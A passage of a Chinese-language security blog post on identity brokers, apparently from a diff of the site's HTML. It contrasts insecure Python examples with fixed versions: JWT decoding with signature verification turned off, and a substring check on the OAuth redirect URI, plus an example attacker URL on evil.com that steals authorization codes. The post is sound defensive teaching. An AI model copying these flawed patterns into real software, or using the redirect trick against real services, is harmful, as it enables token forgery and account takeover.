+<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 解码而不验证！</span>
+    payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span> payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>  <span class="token comment"># 攻击者可以伪造令牌！</span></code></pre>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 验证失败</p><div class="admonition-content"><p><strong>缺少签名验证</strong></p>
+<ul>
+<li>攻击者可以创建假令牌</li>
+<li>没有加密验证</li>
+<li>完全绕过身份验证</li>
+</ul>
+<p><strong>缺少过期检查</strong></p>
+<ul>
+<li>过期的令牌仍然被接受</li>
+<li>被盗的令牌无限期有效</li>
+<li>没有基于时间的安全性</li>
+</ul>
+<p><strong>缺少受众验证</strong></p>
+<ul>
+<li>接受来自其他应用程序的令牌</li>
+<li>跨应用程序令牌重用</li>
+<li>权限提升风险</li>
+</ul>
+</div></div>
+<p>适当的令牌验证：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ✅ 安全：完整的令牌验证</span>
+<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt<span class="token punctuation">,</span> JWTError
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/user'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>
+            token<span class="token punctuation">,</span>
+            key<span class="token operator">=</span>get_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'RS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token comment"># 指定允许的算法</span>
+            audience<span class="token operator">=</span><span class="token string">'my-application'</span><span class="token punctuation">,</span>  <span class="token comment"># 验证受众</span>
+            issuer<span class="token operator">=</span><span class="token string">'https://broker.example.com'</span>  <span class="token comment"># 验证颁发者</span>
+        <span class="token punctuation">)</span>
+        
+        <span class="token comment"># 令牌有效且已验证</span>
+        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span> payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+        
+    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'令牌已过期'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span>
+    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>JWTClaimsError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'无效的声明'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span>
+    <span class="token keyword">except</span> JWTError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'无效的令牌'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
+<h3 id="陷阱-3：不安全的重定向-URI">陷阱 3：不安全的重定向 URI</h3>
+<p>OAuth 2.0 重定向 URI 验证对于安全性至关重要：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ❌ 不安全：弱重定向 URI 验证</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oauth/authorize'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">authorize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    client_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'client_id'</span><span class="token punctuation">)</span>
+    redirect_uri <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'redirect_uri'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 弱验证：子字符串匹配</span>
+    <span class="token keyword">if</span> <span class="token string">'example.com'</span> <span class="token keyword">in</span> redirect_uri<span class="token punctuation">:</span>
+        <span class="token comment"># 生成授权码</span>
+        code <span class="token operator">=</span> generate_auth_code<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>redirect_uri<span class="token punctuation">}</span></span><span class="token string">?code=</span><span class="token interpolation"><span class="token punctuation">{</span>code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> <span class="token string">"无效的重定向 URI"</span><span class="token punctuation">,</span> <span class="token number">400</span>
+
+<span class="token comment"># 攻击者可以使用：https://evil.com?victim=example.com</span>
+<span class="token comment"># 验证通过，授权码发送给攻击者！</span></code></pre>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 重定向 URI 漏洞</p><div class="admonition-content"><p><strong>开放重定向</strong></p>
+<ul>
+<li>授权码发送给攻击者</li>
+<li>可能的账户接管</li>
+<li>启用钓鱼攻击</li>
+</ul>
+<p><strong>子域攻击</strong></p>
+<ul>
+<li>弱验证允许子域</li>
+<li>攻击者注册恶意子域</li>
+<li>窃取授权码</li>
+</ul>
+</div></div>
+<p>安全的重定向 URI 验证：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ✅ 安全：严格的重定向 URI 验证</span>
+REGISTERED_CLIENTS <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'client123'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
+        <span class="token string">'redirect_uris'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
+            <span class="token string">'https://app.example.com/callback'</span><span class="token punctuation">,</span>
+            <span class="token string">'https://app.example.com/oauth/callback'</span>
+        <span class="token punctuation">]</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oauth/authorize'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">authorize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    client_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'client_id'</span><span class="token punctuation">)</span>
+    redirect_uri <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'redirect_uri'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 与注册的 URI 精确匹配</span>
+    client <span class="token operator">=</span> REGISTERED_CLIENTS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> client <span class="token keyword">or</span> redirect_uri <span class="token keyword">not</span> <span class="token keyword">in</span> client<span class="token punctuation">[</span><span class="token string">'redirect_uris'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"无效的重定向 URI"</span><span class="token punctuation">,</span> <span class="token number">400</span>
+    
+    code <span class="token operator">=</span> generate_auth_code<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>redirect_uri<span class="token punctuation">}</span></span><span class="token string">?code=</span><span class="token interpolation"><span class="token punctuation">{</span>code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>
+<h2 id="结论">结论</h2>
+<p>身份代理在分布式系统中集中管理身份验证，提供单点登录、协议转换和统一的身份管理。然而，实现选择会显著影响安全性、性能和用户体验。</p>
+<p>基于令牌和基于会话的身份验证之间的选择涉及基本权衡。基于令牌的身份验证提供无状态可扩展性和微服务兼容性，但在撤销和安全风险方面存在困难。基于会话的身份验证提供立即撤销和细粒度控制，但引入了可扩展性复杂性。使用短期访问令牌和服务器端刷新令牌的混合方法代表了行业最佳实践，平衡了安全性、性能和用户体验。</p>
+<p>协议选择取决于您的环境和要求。OpenID Connect 是新应用程序的现代标准，提供简单的集成、移动支持和专为身份验证而构建的功能。尽管复杂，SAML 对于企业集成和传统系统仍然至关重要。OAuth 2.0 服务于授权需求，但需要 OpenID Connect 才能进行适当的身份验证。</p>
+<p>常见陷阱困扰着身份代理实现。在本地存储中存储令牌会产生 XSS 漏洞——改用 HTTP-only cookie。缺少令牌验证允许攻击者伪造令牌——始终验证签名、过期、受众和颁发者。弱重定向 URI 验证使授权码被盗——对注册的 URI 使用精确匹配。</p>
+<p>身份代理是现代分布式系统的基本基础设施，但它们需要仔细实现。理解身份验证方法之间的权衡、选择适当的协议以及避免常见的安全陷阱可确保您的身份代理增强而不是破坏您的安全态势。复杂性是合理的，因为它带来了好处：统一的身份验证、改进的用户体验以及整个应用程序生态系统的集中安全控制。</p>
+<!-- commentbox plugin begins -->
+    <div class="commentbox"></div>
+    <script src="https://unpkg.com/commentbox.io/dist/commentBox.min.js"></script>
+    <script>commentBox('5765834504929280-proj')</script>
+    <!-- commentbox plugin ends -->
+    
+        </div>
+        <footer class="article-footer">
+            
+    <a data-url="https://neo01.com/zh-CN/2021/12/Identity-Broker-Patterns/" data-id="97d3ab7" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url').replace("http://","https://"),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+    <!--script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "Neo Alienson"
+        },
+        "headline": "身份代理：分布式系统中的集中式身份验证",
+        "image": "https://neo01.com",
+        "keywords": "Architecture Authentication Security",
+        "genre": "Development",
+        "datePublished": "2021-12-24",
+        "dateCreated": "2021-12-24",
+        "dateModified": "2025-10-23",
+        "url": "https://neo01.com//zh-CN/2021/12/Identity-Broker-Patterns/",
+        "description": "身份代理在多个系统中集中管理身份验证，但实现选择会影响安全性、性能和用户体验。了解模式、权衡和陷阱。",
+        "wordCount": 5414
+    }
+</script-->
+
+</article>
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>关注我 :</p>
+        <ul class="social-links">
+                <li>
+                    <a class="social-tooltip" title="stack-exchange" href="https://stackexchange.com/users/2122053/neo?tab=accounts" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-stack-exchange"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="stack-overflow" href="https://stackoverflow.com/users/1885105/neo" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-stack-overflow"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/neoalienson" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-github"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="linkedin" href="https://linkedin.com/in/neo01" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-linkedin"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="rss" href="/atom.xml" target="_blank" rel="noopener">
+                        <i class="icon fa fa-rss"></i>
+                    </a>
+                </li>
+        </ul>
+    </div>
+    <div class="widgets-container">
+        
+            
+                <div class="widget-wrap widget-list">
+    <h3 class="widget-title">链接</h3>
+    <div class="widget">
+        <ul><li><a href="/zh-CN/ai">AI 游乐场</a></li><li><a href="/zh-CN/tools">工具</a></li><li><a href="/zh-CN/games">游戏</a></li><li><a href="/zh-CN/pages/useful-information">实用信息</a></li><li><a href="/zh-CN/pages/Hexo-Blogging-Cheatsheet">Hexo 博客速查表</a></li></ul>
+    </div>
+</div>
+
+            
+                
+            
+                    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-Advanced-Security-Topics/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：高级安全主题" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/zh-CN/categories/Cybersecurity/">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-Advanced-Security-Topics/" class="title">CISP学习指南：高级安全主题</a></p>
+                            <p class="item-date"><time datetime="2025-10-22T16:00:00.000Z" itemprop="datePublished">2025-10-23</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-Email-Security/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：电子邮件安全与网络协议" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/zh-CN/categories/Cybersecurity/">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-Email-Security/" class="title">CISP学习指南：电子邮件安全与网络协议</a></p>
+                            <p class="item-date"><time datetime="2025-10-22T16:00:00.000Z" itemprop="datePublished">2025-10-23</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-Access-Control-Audit-WAPI/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：访问控制机制、蜜网、审计系统与WAPI" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/zh-CN/categories/Cybersecurity/">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-Access-Control-Audit-WAPI/" class="title">CISP学习指南：访问控制机制、蜜网、审计系统与WAPI</a></p>
+                            <p class="item-date"><time datetime="2025-10-21T16:00:00.000Z" itemprop="datePublished">2025-10-22</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-China-Information-Security-Laws/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：中国信息安全法律法规体系" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/zh-CN/categories/Cybersecurity/">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-China-Information-Security-Laws/" class="title">CISP学习指南：中国信息安全法律法规体系</a></p>
+                            <p class="item-date"><time datetime="2025-10-21T16:00:00.000Z" itemprop="datePublished">2025-10-22</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-Firewall-IDS-Technologies/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：防火墙与入侵检测技术" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/zh-CN/categories/Cybersecurity/">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-Firewall-IDS-Technologies/" class="title">CISP学习指南：防火墙与入侵检测技术</a></p>
+                            <p class="item-date"><time datetime="2025-10-21T16:00:00.000Z" itemprop="datePublished">2025-10-22</time></p>
+                        </div>
+                    </li>
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    
+    
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list">
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2025/">2025</a>
+                    <span class="archive-list-count">72</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2024/">2024</a>
+                    <span class="archive-list-count">24</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2023/">2023</a>
+                    <span class="archive-list-count">15</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2022/">2022</a>
+                    <span class="archive-list-count">5</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2021/">2021</a>
+                    <span class="archive-list-count">12</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2020/">2020</a>
+                    <span class="archive-list-count">13</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2019/">2019</a>
+                    <span class="archive-list-count">12</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2018/">2018</a>
+                    <span class="archive-list-count">2</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2017/">2017</a>
+                    <span class="archive-list-count">5</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2016/">2016</a>
+                    <span class="archive-list-count">4</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2015/">2015</a>
+                    <span class="archive-list-count">6</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2014/">2014</a>
+                    <span class="archive-list-count">7</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2013/">2013</a>
+                    <span class="archive-list-count">2</span>
+                </li>
+            
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <!-- disable caching cause each page has different footer from qrcode -->
+        <!-- common/footer, null, {cache: !config.relative_link})  -->
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="qrcode-share-wrapper">
+                <div class="qrcode-text">https://neo01.com/l#9581e0bb</div>
+                <img src="/qr/qr-dabe0c386b6ce9383f029816b5034278.svg" width="200" height="200" alt="QR Code for https://neo01.com/l#9581e0bb">
+            </div>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" title="Homepage" class="logo"></a>
+                </h1>
+                
+                <p>© 2025 Neo Alienson. 版权所有.
+                  <a href="/zh-CN/terms-and-conditions">使用条款</a></p>
+                
+            </div>
+            <div class="footer-plugins">
+              
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+        
+    
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+    
+
+
+
+<!-- Custom Scripts -->
+
+
+
+
+    </div>
+<!-- hexo injector body_end start --><script type="text/javascript" src="/js/bundle_last.js"></script><!-- hexo injector body_end end -->
+
+</body></html>
